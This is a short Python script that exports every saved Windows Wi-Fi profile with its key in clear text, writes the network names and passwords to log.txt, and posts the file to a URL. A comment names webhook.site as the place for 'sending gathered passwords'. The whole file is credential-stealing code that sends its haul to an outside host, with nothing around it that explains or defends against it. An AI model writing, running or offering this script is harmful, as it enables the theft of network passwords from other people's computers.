import subprocess
import os
import sys
import requests


password_file = open("log.txt", "w", encoding="utf-8")
password_file.write("Password List: \n")
password_file.close()

wifi_files = []
wifi_name = []
wifi_password = []

command = subprocess.run(["netsh", "wlan", "export", "profiles", "key=clear"], capture_output= True).stdout.decode()

path = os.getcwd()

for file_name in os.listdir(path):
    if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
        wifi_files.append(file_name)
        for i in wifi_files:
            with open(i, "r") as f:
                for line in f.readlines():
                    if "name" in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if "keyMaterial" in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("log.txt", "a", encoding="utf-8")
                            #sys.stdout.write(f"SSID: {x} Password: {y}", sep = "\n")
                            print(f"SSID: {x} Password: {y}", sep = "\n")
                            sys.stdout.close()
           
url = ""  #you can use this website for sending gathered passwords https://webhook.site/

with open("log.txt", "r") as f:
    r = requests.post(url, data=f)
